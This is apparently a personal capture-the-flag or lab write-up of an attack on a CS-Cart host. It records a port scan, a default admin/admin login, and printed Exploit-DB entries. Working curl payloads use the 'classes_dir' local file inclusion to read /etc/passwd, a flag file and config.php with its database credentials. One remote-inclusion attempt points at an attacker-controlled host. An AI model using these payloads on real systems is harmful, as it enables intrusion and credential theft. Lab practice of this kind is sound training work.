```
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# nmap  192.168.234.39 -p- -v                                                         Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-18 13:11 +08
Initiating Ping Scan at 13:11                                                           Scanning 192.168.234.39 [4 ports]
Completed Ping Scan at 13:11, 0.33s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:11
Completed Parallel DNS resolution of 1 host. at 13:11, 1.03s elapsed
Initiating SYN Stealth Scan at 13:11
Scanning 192.168.234.39 [65535 ports]
Discovered open port 139/tcp on 192.168.234.39
Discovered open port 995/tcp on 192.168.234.39                                          Discovered open port 993/tcp on 192.168.234.39                                          Discovered open port 143/tcp on 192.168.234.39
Discovered open port 445/tcp on 192.168.234.39
Discovered open port 22/tcp on 192.168.234.39
Discovered open port 80/tcp on 192.168.234.39                                           Discovered open port 110/tcp on 192.168.234.39
... 
SYN Stealth Scan Timing: About 86.91% done; ETC: 13:24 (0:01:42 remaining)
SYN Stealth Scan Timing: About 93.91% done; ETC: 13:23 (0:00:46 remaining)
Completed SYN Stealth Scan at 13:23, 743.26s elapsed (65535 total ports)
Nmap scan report for 192.168.234.39                                                     Host is up (0.25s latency).
Not shown: 65527 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
139/tcp open  netbios-ssn
143/tcp open  imap
445/tcp open  microsoft-ds
993/tcp open  imaps
995/tcp open  pop3s

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 744.88 seconds
           Raw packets sent: 72656 (3.197MB) | Rcvd: 67657 (2.707MB)
┌──(root💀DESKTOP-61F9HO2)-[~]
└─# 
```

Web credentials is admin admin
https://forum.cs-cart.com/topic/4099-login-password-issue/

Using Lynx Web browser

```
←              CS-Cart. Powerful PHP shopping cart software - Privacy policy (p3 of 3)
   The personal information collected on this Site will be used to provide the
   services you have requested.
   We may use your personal information to provide you with important information
   about the product or service that you are using, including critical updates and
   notifications. Additionally, we may send you information about other CS-Cart
   products and services.
                                                                                           Questions:                                                                                                                                                                      If you have any questions about this Privacy Statement or concerns about the            way we process your Personal Data, please contact us using the Contact Us form.
   We may occasionally modify this privacy statement. All such changes will be             reflected on this web page.
          Authentication
   Admin Admin is logged in!

    My account                                                                              Log out
          Site news                                                                        Submit e-mail address to receive free updates and promotions

   Enter e-ma                                                                                  Home   |   About Us  |   Contact Us  |   Privacy policy  |   Site map

       Copyright © 2006 CS-Cart.com.
(NORMAL LINK) Use right-arrow or <return> to activate.
  Arrow keys: Up and Down to move.  Right to follow a link; Left to go back.
 H)elp O)ptions P)rint G)o M)ain screen Q)uit /=search [delete]=history list
```

Copyright © 2006 CS-Cart.com.
https://forum.cs-cart.com/topic/1685-how-do-i-know-what-version-i-have/

LFI

https://www.exploit-db.com/exploits/48890


```
┌──(root💀DESKTOP-61F9HO2)-[/]
└─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../.
./../../../../../../../etc/passwd%00'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh                                                              sys:x:3:3:sys:/dev:/bin/sh                                                              sync:x:4:65534:sync:/bin:/bin/sync                                                      games:x:5:60:games:/usr/games:/bin/sh                                                   man:x:6:12:man:/var/cache/man:/bin/sh                                                   lp:x:7:7:lp:/var/spool/lpd:/bin/sh                                                      mail:x:8:8:mail:/var/mail:/bin/sh                                                       news:x:9:9:news:/var/spool/news:/bin/sh                                                 uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh                                               proxy:x:13:13:proxy:/bin:/bin/sh                                                        www-data:x:33:33:www-data:/var/www:/bin/sh                                              backup:x:34:34:backup:/var/backups:/bin/sh                                              list:x:38:38:Mailing List Manager:/var/list:/bin/sh                                     irc:x:39:39:ircd:/var/run/ircd:/bin/sh                                                  gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh                 nobody:x:65534:65534:nobody:/nonexistent:/bin/sh                                        dhcp:x:100:101::/nonexistent:/bin/false                                                 syslog:x:101:102::/home/syslog:/bin/false                                               klog:x:102:103::/home/klog:/bin/false                                                   mysql:x:103:107:MySQL Server,,,:/var/lib/mysql:/bin/false                               dovecot:x:104:111:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false                    postfix:x:105:112::/var/spool/postfix:/bin/false
sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin                                       patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
<br />
<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# 
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=http://192.168.49.234/%00'                                                                        <br />
<b>Warning</b>:  require_once() [<a href='function.require-once'>function.require-once</a>]: URL file-access is disabled in the server configuration in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />
<br />
<b>Warning</b>:  require_once(http://192.168.49.234/) [<a href='function.require-once'>function.require-once</a>]: failed to open stream: no suitable wrapper could be found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />
<br />
<b>Fatal error</b>:  require_once() [<a href='function.require'>function.require</a>]: Failed opening required 'http://192.168.49.234/' (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                                                                    ┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─#
```

Exploits research

```
┌──(kali㉿localhost)-[/tmp]
└─$ searchsploit -m 48890
  Exploit: CS-Cart 1.3.3 - 'classes_dir' LFI
      URL: https://www.exploit-db.com/exploits/48890
     Path: /usr/share/exploitdb/exploits/php/webapps/48890.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /tmp/48890.txt



┌──(kali㉿localhost)-[/tmp]
└─$ cat 48890.txt
# Exploit Title: CS-Cart unauthenticated LFI
# Date: 2020-09-22
# Exploit Author:  0xmmnbassel
# Vendor Homepage: https://www.cs-cart.com/e-commerce-platform.html
# Tested at: ver. 1.3.4
# Vulnerability Type: unauthenticated LFI


http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]%00
example:
http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
http://www.site.com/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../etc/passwd%00
┌──(kali㉿localhost)-[/tmp]
└─$ searchsploit cs-cart
------------------------------------------------------ ---------------------------------
 Exploit Title                                        |  Path
------------------------------------------------------ ---------------------------------
CS-Cart - Multiple SQL Injections                     | php/webapps/27030.txt
CS-Cart 1.3.2 - 'index.php' Cross-Site Scripting      | php/webapps/31443.txt
CS-Cart 1.3.3 - 'classes_dir' LFI                     | php/webapps/48890.txt
CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion   | php/webapps/1872.txt
CS-Cart 1.3.3 - 'install.php' Cross-Site Scripting    | multiple/webapps/14962.txt
CS-Cart 1.3.3 - authenticated RCE                     | php/webapps/48891.txt
CS-Cart 1.3.5 - Authentication Bypass                 | php/webapps/6352.txt
CS-Cart 2.0.0 Beta 3 - 'Product_ID' SQL Injection     | php/webapps/8184.txt
CS-Cart 2.0.5 - 'reward_points.post.php' SQL Injectio | php/webapps/33146.txt
CS-Cart 2.2.1 - 'products.php' SQL Injection          | php/webapps/36093.txt
CS-Cart 4.2.4 - Cross-Site Request Forgery            | php/webapps/36358.html
CS-Cart 4.3.10 - XML External Entity Injection        | php/webapps/40770.txt
------------------------------------------------------ ---------------------------------
Shellcodes: No Results

┌──(kali㉿localhost)-[/tmp]
└─$ searchsploit -m 1872
  Exploit: CS-Cart 1.3.3 - 'classes_dir' Remote File Inclusion
      URL: https://www.exploit-db.com/exploits/1872
     Path: /usr/share/exploitdb/exploits/php/webapps/1872.txt
File Type: ASCII text, with CRLF line terminators

Copied to: /tmp/1872.txt



┌──(kali㉿localhost)-[/tmp]
└─$ cat 1872.txt
$$$$$$$$$$$$$$$ DEVIL TEAM THE BEST POLISH TEAM $$$$$$$$$$$$$$$
$$
$$  CS-Cart 1.3.3 (classes_dir) <= Remote File Include Vulnerability
$$  Script site: http://www.cs-cart.com
$$  Dork: Powered by CS-Cart - Shopping Cart Software
$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$
$$              Find by: Kacper (a.k.a Rahim)
$$
$$ Contact: kacper1964@yahoo.pl   or   http://www.devilteam.yum.pl
$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
$$
$$  Greetz: DragonHeart, Satan, Leito, Leon, Luzak,
$$           Adam, DeathSpeed, Drzewko, pepi
$$
$$  Specjal greetz: DragonHeart ;-)
$$
$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$

Expl:

http://www.site.com/[CS-Cart_path]/classes/phpmailer/class.cs_phpmailer.php?classes_dir=[evil_scripts]

#Pozdro dla wszystkich ;-)

# milw0rm.com [2006-06-03]
┌──(kali㉿localhost)-[/tmp]
└─$ 
```

Local

```
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../home/patrick/local.txt%00'                                       1ce3f0af025d277a6d3e664e6593778a                                                        <br />
<b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />                                             ┌──(root💀DESKTOP-61F9HO2)-[/]
└─# 
```

More LFI Testiny

```
┌──(root💀DESKTOP-61F9HO2)-[/]
└─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/convert.base64-encode/resource=/etc/passwd%00'
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovYmluL3NoCmJpbjp4OjI6MjpiaW46L2JpbjovYmluL3NoCnN5czp4OjM6MzpzeXM6L2RldjovYmluL3NoCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L2Jpbi9zaAptYW46eDo2OjEyOm1hbjovdmFyL2NhY2hlL21hbjovYmluL3NoCmxwOng6Nzo3OmxwOi92YXIvc3Bvb2wvbHBkOi9iaW4vc2gKbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovYmluL3NoCm5ld3M6eDo5Ojk6bmV3czovdmFyL3Nwb29sL25ld3M6L2Jpbi9zaAp1dWNwOng6MTA6MTA6dXVjcDovdmFyL3Nwb29sL3V1Y3A6L2Jpbi9zaApwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L2Jpbi9zaAp3d3ctZGF0YTp4OjMzOjMzOnd3dy1kYXRhOi92YXIvd3d3Oi9iaW4vc2gKYmFja3VwOng6MzQ6MzQ6YmFja3VwOi92YXIvYmFja3VwczovYmluL3NoCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L2Jpbi9zaAppcmM6eDozOTozOTppcmNkOi92YXIvcnVuL2lyY2Q6L2Jpbi9zaApnbmF0czp4OjQxOjQxOkduYXRzIEJ1Zy1SZXBvcnRpbmcgU3lzdGVtIChhZG1pbik6L3Zhci9saWIvZ25hdHM6L2Jpbi9zaApub2JvZHk6eDo2NTUzNDo2NTUzNDpub2JvZHk6L25vbmV4aXN0ZW50Oi9iaW4vc2gKZGhjcDp4OjEwMDoxMDE6Oi9ub25leGlzdGVudDovYmluL2ZhbHNlCnN5c2xvZzp4OjEwMToxMDI6Oi9ob21lL3N5c2xvZzovYmluL2ZhbHNlCmtsb2c6eDoxMDI6MTAzOjovaG9tZS9rbG9nOi9iaW4vZmFsc2UKbXlzcWw6eDoxMDM6MTA3Ok15U1FMIFNlcnZlciwsLDovdmFyL2xpYi9teXNxbDovYmluL2ZhbHNlCmRvdmVjb3Q6eDoxMDQ6MTExOkRvdmVjb3QgbWFpbCBzZXJ2ZXIsLCw6L3Vzci9saWIvZG92ZWNvdDovYmluL2ZhbHNlCnBvc3RmaXg6eDoxMDU6MTEyOjovdmFyL3Nwb29sL3Bvc3RmaXg6L2Jpbi9mYWxzZQpzc2hkOng6MTA2OjY1NTM0OjovdmFyL3J1bi9zc2hkOi91c3Ivc2Jpbi9ub2xvZ2luCnBhdHJpY2s6eDoxMDAwOjEwMDA6cGF0cmljaywsLDovaG9tZS9wYXRyaWNrOi9iaW4vYmFzaAo=<br />                                                                                      <b>Fatal error</b>:  Class 'PHPMailer' not found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>6</b><br />                                             
┌──(root💀DESKTOP-61F9HO2)-[/]
└─#
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=data://text/plain,aaaa%00'                                                                        <br />
<b>Warning</b>:  require_once() [<a href='function.require-once'>function.require-once</a>]: URL file-access is disabled in the server configuration in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                 <br />                                                                                  <b>Warning</b>:  require_once(data://text/plain,aaaa) [<a href='function.require-once'>function.require-once</a>]: failed to open stream: no suitable wrapper could be found in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />         <br />                                                                                  <b>Fatal error</b>:  require_once() [<a href='function.require'>function.require</a>]: Failed opening required 'data://text/plain,aaaa' (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                                                                    ┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─#
┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../../var/log/apache2/access.log%00'                                   <br />                                                                                  <b>Warning</b>:  require_once(../../../../../../../../../../../var/log/apache2/access.log) [<a href='function.require-once'>function.require-once</a>]: failed to open stream: Permission denied in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                                                             <br />                                                                                  <b>Fatal error</b>:  require_once() [<a href='function.require'>function.require</a>]: Failed opening required '../../../../../../../../../../../var/log/apache2/access.log' (include_path='.:/usr/share/php:/usr/share/pear') in <b>/var/www/classes/phpmailer/class.cs_phpmailer.php</b> on line <b>4</b><br />                                               ┌──(root💀DESKTOP-61F9HO2)-[/]                                                          └─#
```


```
┌──(root💀DESKTOP-61F9HO2)-[/tmp]                                                       └─# wfuzz -w list.txt '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=../../../../../../../../../../..FUZZ%00' > fuzz.txt                                   /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.                                                      ┌──(root💀DESKTOP-61F9HO2)-[/tmp]                                                       └─# wget https://raw.githubusercontent.com/hussein98d/LFI-files/master/list.txt
```


```
┌──(root💀DESKTOP-61F9HO2)-[/tmp]                                                       └─# curl '192.168.234.39/classes/phpmailer/class.cs_phpmailer.php?classes_dir=php://filter/convert.base64-encode/resource=../../config.php%00' | base64 -d | head -c 400          % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                          Dload  Upload   Total   Spent    Left  Speed             0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0<?php                                                                                             //                                                                                      // $Id: config.php 1822 2006-05-17 16:44:43Z                                            //                                                                                                                                                                              if ( !defined('IN_CSCART') ) { die('Access denied'); }                                                                                                                          $db_host = 'localhost';                                                                 $db_name = 'cscart';                                                                    $db_user = 'root';                                                                      $db_password = 'root';                                                                                                                                                          // Example:                                                                             // Your url is http://www.yourcompany.com/store/cscart                                  // cscart_http_host = 'www.yourcompany.com';                                            // cscart_http_dir = '/store/cscart';                                                   //                                                                                      100 15191    0 15191    0     0  15596      0 --:--:-- --:--:-- --:--:-- 15596          (23) Failed writing body                                                                ┌──(root💀DESKTOP-61F9HO2)-[/tmp]                                                       └─#
```
